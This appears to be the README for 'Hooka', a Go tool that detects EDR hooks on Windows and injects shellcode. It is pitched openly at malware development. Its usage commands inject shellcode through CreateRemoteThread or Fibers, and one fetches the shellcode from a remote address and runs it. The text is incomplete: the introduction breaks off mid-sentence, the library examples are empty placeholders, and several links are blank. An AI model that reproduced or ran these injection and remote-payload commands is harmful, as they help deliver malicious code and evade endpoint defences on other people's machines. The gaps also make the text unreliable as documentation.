<p align="center">
  <h1 align="center">Hooka</h1>
  <p align="center">~ Windows hooks detector and shellcode injector written in Golang ~</p>
</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#usage">Usage</a> •
  <a href="#library">Library</a> •
  <a href="#contributing">Contributing</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

I started this project 

There's not to much info about detecting Windows hooks in ***Golang*** so I decided to try by my own and I've also taken some code from [BananaPhone]() project (thanks a lot to ***C-Sto**)

# Usage

You just have to clone the repository like this:

```sh
git clone https://github.com/D3Ext/Hooka
```

```
help panel
```

> Detect hooked functions by EDR
```sh
.\Hooka.exe --hooks
```

> Inject shellcode from URL
```sh
.\Hooka.exe --inject CreateRemoteThread --url http://192.168.116.37/shellcode.bin
```

> Inject shellcode from file
```sh
.\Hooka.exe --inject Fibers --file shellcode.bin
```

# Demo

# Library

If you're looking to implement any function in your malware you can do it using the official library API:

```go
...



...
```


```go
...



...
```


```go
...



...
```

# Contributing

Do you wanna improve the code with any idea or code optimization? You're in the right place

See [CONTRIBUTING.md]()

# References

```
https://github.com/C-Sto/BananaPhone
https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
https://github.com/Kara-4search/HookDetection_CSharp
https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
```

# Disclaimer

Creator isn't in charge of any and has no responsibility for any kind of: illegal use of the project, malicious act, capable of causing damage to third parties

Use this project under your own responsability!

# License

This project is licensed under [MIT]() license

Copyright © 2023, *D3Ext*



